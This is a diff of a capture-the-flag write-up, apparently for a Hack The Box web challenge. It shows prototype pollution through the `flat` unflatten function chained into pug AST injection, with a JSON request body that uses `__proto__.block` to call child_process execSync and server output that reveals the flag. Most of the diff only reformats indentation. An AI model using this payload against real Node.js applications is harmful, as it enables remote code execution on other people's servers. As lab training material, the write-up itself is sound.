@@ -13,18 +13,18 @@ So let's go through the source code which is made available to us.
 
 ### Quick Recon
 - Packages installed (`package.json`)
-	```json
-	"dependencies": {
-		"express": "^4.17.1",
-		"flat": "5.0.0",
-		"pug": "^3.0.0"
-	}
-	```
-	- We have `pug:3.0.0` which is vulnerable to RCE.
-	- Source: https://github.com/pugjs/pug/issues/3312
-
+```json
+		"dependencies": {
+			"express": "^4.17.1",
+			"flat": "5.0.0",
+			"pug": "^3.0.0"
+		}
+```
+- We have `pug:3.0.0` which is vulnerable to RCE.
+- Source: https://github.com/pugjs/pug/issues/3312
+---
 - Location of vulnerability (`routes/index.js`)
-	```js
+```js
 	const pug = require('pug');
 
 	...
@@ -41,8 +41,7 @@ So let's go through the source code which is made available to us.
 			});
 		}
 	});
-	```
-
+```
 - Request submitted through `/api/submit` where body of the request(`req.body`) is passed to `unflatten`.
 - So we can pass our payload through the body and when it is unflattened, we can prolly get RCE.
 
@@ -70,7 +69,6 @@ Connection: close
 	}
 }
 ```
-
 - Output:
 ```html
 <pre>Error: Command failed: $(ls | grep flag)<br>/bin/sh: flagQLGyS: not found<br> on line 1<br>
@@ -79,19 +77,18 @@ Connection: close
 
 - Now let's `cat` the file
 	- Reques bodyt:
-		```json
+```json
 		{
 			"artist.name":"Haigh","__proto__.block": {
 	        "type": "Text", 
 	        "line": "process.mainModule.require('child_process').execSync('$(cat flagQLGyS)')"
 		    }
 		}
-		```
+```
 	- Output:
-	```html
+```html
 	<pre>Error: Command failed: $(cat flagQLGyS)<br>/bin/sh: HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}: not found
 	<br> on line 1<br>
-	```
-
+```
 References:
 - (Peak resource) https://blog.p6.is/AST-Injection/
